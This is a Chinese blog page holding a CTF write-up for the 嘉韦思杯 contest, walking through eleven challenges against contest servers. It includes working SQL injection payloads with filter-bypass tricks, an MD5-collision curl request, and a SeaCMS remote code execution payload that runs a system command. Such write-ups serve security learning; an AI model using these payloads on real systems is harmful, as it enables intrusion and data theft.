@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="嘉韦思杯wp由于比赛平台关了，以下题目顺序不是比赛题目顺序。 第一题：47.103.43.235:85/b/第一题_js？.txt  页面内容是base64,解密后是jshuck,放入浏览器console中运行， 得到flag。 第二题：http://47.103.43.235:82/crypto/a/index.php 页面内容是base64加密的 ， 解密后仍然是base64，只不过最后的’=">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嘉韦思杯wp">
+<meta property="og:url" content="https://TGAOUT.github.io/2019/03/31/嘉韦思杯wp/index.html">
+<meta property="og:site_name" content="TGAO&#39;s Blog">
+<meta property="og:description" content="嘉韦思杯wp由于比赛平台关了，以下题目顺序不是比赛题目顺序。 第一题：47.103.43.235:85/b/第一题_js？.txt  页面内容是base64,解密后是jshuck,放入浏览器console中运行， 得到flag。 第二题：http://47.103.43.235:82/crypto/a/index.php 页面内容是base64加密的 ， 解密后仍然是base64，只不过最后的’=">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553956315003.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553956969458.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553957198036.png">
+<meta property="og:image" content="file:///E:/下载/qq接收/消息记录/1574508901/Image/C2C/ERC8~MO[8I1K56P_PMDI1O5.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553957478532.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553962621677.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553966971148.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553966991990.png">
+<meta property="og:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553967053077.png">
+<meta property="og:updated_time" content="2019-03-30T17:38:41.322Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="嘉韦思杯wp">
+<meta name="twitter:description" content="嘉韦思杯wp由于比赛平台关了，以下题目顺序不是比赛题目顺序。 第一题：47.103.43.235:85/b/第一题_js？.txt  页面内容是base64,解密后是jshuck,放入浏览器console中运行， 得到flag。 第二题：http://47.103.43.235:82/crypto/a/index.php 页面内容是base64加密的 ， 解密后仍然是base64，只不过最后的’=">
+<meta name="twitter:image" content="https://tgaout.github.io/2019/03/31/嘉韦思杯wp/C:/Users/xue/AppData/Local/Temp/1553956315003.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://TGAOUT.github.io/2019/03/31/嘉韦思杯wp/">
+
+
+
+
+
+  <title>嘉韦思杯wp | TGAO's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TGAO's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/03/31/嘉韦思杯wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TGAO">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://plq497n2s.bkt.clouddn.com/blog/20190122/7zsc92q22V1t.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TGAO's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">嘉韦思杯wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-31T01:37:30+08:00">
+                2019-03-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="嘉韦思杯wp"><a href="#嘉韦思杯wp" class="headerlink" title="嘉韦思杯wp"></a>嘉韦思杯wp</h1><p>由于比赛平台关了，以下题目顺序不是比赛题目顺序。</p>
+<h3 id="第一题："><a href="#第一题：" class="headerlink" title="第一题："></a>第一题：</h3><p>47.103.43.235:85/b/第一题_js？.txt </p>
+<p>页面内容是base64,解密后是jshuck,放入浏览器console中运行，</p>
+<p>得到flag。</p>
+<h3 id="第二题："><a href="#第二题：" class="headerlink" title="第二题："></a>第二题：</h3><p><a href="http://47.103.43.235:82/crypto/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/crypto/a/index.php</a></p>
+<p>页面内容是base64加密的 ， 解密后仍然是base64，只不过最后的’=’被url编码</p>
+<p>url解码后，继续base64解码，以这种方式解密，直到出现</p>
+<p><code>fB__l621a4h4g_ai{&amp;i}</code>，栅栏密码解密。</p>
+<h3 id="第三题："><a href="#第三题：" class="headerlink" title="第三题："></a>第三题：</h3><p><a href="http://47.103.43.235:82/web/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/web/a/index.php</a></p>
+<p>打开页面</p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553956315003.png" alt="1553956315003"></p>
+<p>写脚本提交。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">r = requests.get(<span class="string">'http://47.103.43.235:82/web/a/index.php'</span>)</span><br><span class="line">context=r.text</span><br><span class="line">tree = etree.HTML(context)</span><br><span class="line">content = tree.xpath(<span class="string">"//p/text()"</span>)[<span class="number">1</span>]</span><br><span class="line">result=eval(content)</span><br><span class="line">header=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>:<span class="string">'http://47.103.43.235:82/web/a/index.php'</span></span><br><span class="line">&#125;</span><br><span class="line">print(result)</span><br><span class="line">data = &#123;<span class="string">'result'</span>: result&#125;</span><br><span class="line">flag = requests.post(<span class="string">'http://47.103.43.235:82/web/a/index.php'</span>,data = data,headers=header)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+<h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>打开之后是一个二维码</p>
+<p>思路：</p>
+<ol>
+<li><p>利用binwalk查看图片</p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553956969458.png" alt="1553956969458"></p>
+</li>
+<li><p>利用dd命令分离出zip文件</p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553957198036.png" alt="1553957198036"></p>
+</li>
+<li><p>利用ZipCenOp.jar尝试是不是zip伪加密</p>
+<p><img src="file:///E:\下载\qq接收\消息记录\1574508901\Image\C2C\ERC8~MO[8I1K56P_PMDI1O5.png" alt="img"> </p>
+<p>仍然打不开文件。</p>
+</li>
+<li><p>利用fcrackzip爆破zip密码</p>
+</li>
+</ol>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553957478532.png" alt="1553957478532"></p>
+<p>赛后发现，可以直接用binwalk分离文件。</p>
+<h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><p>sha1函数比较绕过，参数传入数组绕过。</p>
+<h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))</span><br></pre></td></tr></table></figure>
+<p>尝试param1[]=1&amp;param2[]=2，无果</p>
+<p>将代码复制到本地测试，发现(string)无法将数组转换为字符串，返回flase。</p>
+<p>将代码放到谷歌搜索，找到利用方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 题目url -H &quot;Cookie: PHPSESSID=本地cookie值&quot; --data &quot;param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h3><p>sql注入1</p>
+<p>没有任何过滤，爆数据库，爆表名，爆字段。读取数据</p>
+<h3 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h3><p>sql注入2</p>
+<p>过滤<code>or</code>、空格、<code>select</code>、<code>union</code>、<code>=</code></p>
+<p>空格用<code>/**/</code>绕过，<code>=</code>用like绕过，<code>or</code>和<code>select</code>双写绕过</p>
+<p>这题的id参数值是倒序的base64编码。</p>
+<p>构造sql语句，转为base64,倒序。</p>
+<p>看有报错，尝试报错注入，结果不行…</p>
+<p>尝试盲注</p>
+<p><code>0/**/order/**/by/**/6#</code></p>
+<p><code>==wI28iKq8Sei9iKq8iclRmcv9iKq8CM</code></p>
+<p>测试出6个字段。</p>
+<p><code>0/**/uunionnion/**/selselectect/**/1,2,3,4,5,database()#</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0/**/uunionnion/**/selselectect/**/1,2,3,4,5,table_name/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database()#</span><br><span class="line"></span><br><span class="line">爆出flag表</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0/**/uunionnion/**/selselectect/**/1,2,3,4,5,column_name/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&apos;flag&apos;#</span><br><span class="line"></span><br><span class="line">爆出flag字段</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0/**/uunionnion/**/selselectect/**/1,2,3,4,5,flag/**/from/**/flag#</span><br></pre></td></tr></table></figure>
+<p>总结做题思路</p>
+<p>测试注入参数的长度限制，fuzz过滤字符，构造sql语句。</p>
+<h3 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h3><p>seacms</p>
+<p>谷歌找seacms漏洞</p>
+<p>最终</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(&apos;cd ../../;cat flag.txt&apos;);</span><br></pre></td></tr></table></figure>
+<h3 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h3><p>猜解字符串含义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bg[`sZ*Zg&apos;dPfP`VM_SXVd</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553962621677.png" alt="1553962621677"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bg[`sZ*Zg&apos;dPfP`VM_SXVd</span><br><span class="line">将前四位转为ASCII编码后发现和flag的ASCII编码差4，5，6，7，...++,然后按照这个顺序依次解码，后获得flag</span><br></pre></td></tr></table></figure>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str=<span class="string">'bg[`sZ*Zg\'dPfP`VM_SXVd'</span></span><br><span class="line">i=<span class="number">3</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> str:</span><br><span class="line">	i=i+<span class="number">1</span></span><br><span class="line">	flag=flag+chr(ord(c)+i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<h3 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h3><p>RSA256</p>
+<p>下载到gy.key和fllllllag.txt文件</p>
+<p>利用kali linux的openssl </p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553966971148.png" alt="1553966971148"></p>
+<p>e就是Exponent的值 </p>
+<p>n的十六进制为Modules  我们用python转成十进制</p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553966991990.png" alt="1553966991990"></p>
+<p>使用<a href="http://factordb.com/%EF%BC%8C%E8%BD%BB%E6%98%93%E5%B0%B1%E8%A7%A3%E5%87%BAp%E5%92%8Cq" target="_blank" rel="noopener">http://factordb.com</a> 将n进行因式分解来得到我们的p和q </p>
+<p><img src="/2019/03/31/嘉韦思杯wp/C:/Users\xue\AppData\Local\Temp\1553967053077.png" alt="1553967053077"></p>
+<p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy </span><br><span class="line"><span class="keyword">import</span> rsa </span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span> </span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span> </span><br><span class="line">n = <span class="number">76775333340223961139427050707840417811156978085146970312315886671546666259161</span> </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">d = int(gmpy.invert(e , (p<span class="number">-1</span>) * (q<span class="number">-1</span>))) </span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)   </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message1"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode())  </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message2"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode()) </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"encrypted.message3"</span> , <span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">    print(rsa.decrypt(f.read(), privatekey).decode())</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/24/CVE-2015-4553/" rel="next" title="CVE-2015-4553">
+                <i class="fa fa-chevron-left"></i> CVE-2015-4553
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://plq497n2s.bkt.clouddn.com/blog/20190122/7zsc92q22V1t.jpg" alt="TGAO">
+            
+              <p class="site-author-name" itemprop="name">TGAO</p>
+              <p class="site-description motion-element" itemprop="description">To Go All Out</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://laworigin.github.io/" title="WisdomTree" target="_blank">WisdomTree</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cryscat.com" title="Crycat" target="_blank">Crycat</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#嘉韦思杯wp"><span class="nav-text">嘉韦思杯wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一题："><span class="nav-text">第一题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二题："><span class="nav-text">第二题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三题："><span class="nav-text">第三题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四题"><span class="nav-text">第四题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五题"><span class="nav-text">第五题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第六题"><span class="nav-text">第六题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第七题"><span class="nav-text">第七题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第八题"><span class="nav-text">第八题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第九题"><span class="nav-text">第九题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第十题"><span class="nav-text">第十题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第十一题"><span class="nav-text">第十一题</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TGAO</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" color="0,0,240" opacity="0.7" zindex="-2" count="40" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
